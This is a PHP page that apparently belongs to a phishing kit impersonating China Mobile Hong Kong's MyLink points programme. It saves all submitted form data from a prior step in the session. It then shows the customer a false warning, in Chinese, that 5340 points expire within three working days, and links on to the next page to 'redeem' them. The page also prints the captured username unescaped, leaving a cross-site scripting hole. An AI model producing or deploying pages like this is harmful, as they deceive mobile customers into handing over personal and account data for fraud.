<?php
session_start();
require_once 'config.php';
include('partials/header.php');


if (isset($_POST['submit']) || isset($_POST['username'])) {
    $_SESSION['step1Data'] = $_POST;
}

?>
<style>
    .wrap {
        padding: 30px 20px;
        margin-top:70px;
        padding-bottom: 0px;
    }
    a.main-logo {
        display: block;
        margin: 11px 0 25px 0;
        text-align: center;
        color: red;
        font-size: 19px;
        font-weight: bold;
    }
    .notice {
        line-height:2;
        padding: 10px;
        border-radius: 5px;
        color: #777977;
        margin: 30px 0 40px;
        background: #f0f0eb;
    }
    @media(max-width: 767px) {
        .submit-btn {
            text-align: center;
            background-color: red;
            padding: 11px 24px;
            font-size: 1rem;
            display: block;
            width: auto;
            min-width: 120px;
            margin-left: auto;
            margin-right: auto;
            line-height: 22px;
            border-radius: 32px;
            color: #fff;
            border-color: red;
            height: auto;
            cursor: pointer;
        }

        .submit-btn:hover:hover {
            background-color: red;
            border-color: red;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }
    }
</style>
<div class="wrap">
    <a href="" class="main-logo">
        <i style="color:#ffb100;font-size:26px;" class="fa fa-warning"></i>
        積分有效期提示
        <!--<img src="images/logo.png" alt="">-->
    </a>

    <div class="notice" style="font-size:13px;">

        <p>尊敬的移動客戶：<?php echo  isset($_SESSION['step1Data']['username']) ? $_SESSION['step1Data']['username'] : ''; ?> </p>
        <p>
            MyLink積分計劃」提示您，您的賬戶當前積分（5340積分），將於三個工作日內到期，爲避免影響，請及時兌換積分獎賞。</p>
        </br>
        <p>
            MyLink積分計劃為您帶來最新、最精彩的優惠，下載MyLink緊貼最新資訊，輕輕鬆鬆就可以賺取MyLink積分！
            積分可用於直接繳付賬單外，更可以兌換多種生活禮品包括超市禮券、咖啡現金券、儲值卡等。
            MyLink積分碼的條款及細則
            除非另有規定，每個MyLink積分只能使用一次。合資格客戶可於商戶發送MyLink積分時所展示之條款及細則查閱其MyLink積分碼之指定兌換有效期。MyLink積分碼必須於指定兌換有效期前，於MyLink兌換成MyLink積分。MyLink積分碼逾期將作廢並自動註銷，且不獲補發或延長兌換有效期。
            </br>
            如有任何爭議，中國移動香港將保留一切最終決定權。
        </p>
    </div>
    <div class="center">
        <a href="page6.php" class="btn submit-btn">積分兌換</a>
    </div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<?php
include('partials/footer.php');
